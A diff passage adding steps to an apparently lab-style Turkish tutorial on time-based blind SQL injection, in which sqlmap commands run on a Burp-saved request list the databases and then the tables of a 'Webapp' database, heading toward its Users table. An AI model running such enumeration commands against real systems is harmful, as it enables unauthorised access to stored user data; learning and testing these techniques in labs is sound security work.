@@ -82,4 +82,18 @@ buradaki isteği kaydettikten sonra text editör ile açıyoruz
 
 gördüğünüz gibi usertest yazısının sonuna * karakteri eklenmiştir.Bu burp için post isteğinin, payloadların nereye gönderileceği belirtilmiştir.Dosyayı kaydedip kapatıyoruz.
 
+<code>sqlmap -r burpresult.txt(dosya adımız) --technique T --dbms mysql --dbs </code>
+
+komutunu çalıştırıyoruz ve açığın var olduğunu görüp veritabanı isimlerini çekmeyi başlıyoruz.
+
+![16](https://user-images.githubusercontent.com/32979760/115159382-8bc12c80-a09b-11eb-8a64-90496a8f0fc8.PNG)
+
+Veritabanı isimlerine bakıldığında Webapp adlı veritabanının bilgileri çekileceği aşikardır.
+
+<code>sqlmap -r burpresult.txt --dbms mysql --technique T --tables -D Webapp </code>
+
+![17](https://user-images.githubusercontent.com/32979760/115159498-12760980-a09c-11eb-9987-4817fbe2b799.PNG)
+![18](https://user-images.githubusercontent.com/32979760/115159528-376a7c80-a09c-11eb-87ed-046d6005935c.PNG)
+
+Tek tablo olan Users tablosunun içerisindeki kolonları çekmeye başlayalım ama önce kolon içerisindeki verileri çekmek için kolon isimlerini öğrenelim.
 
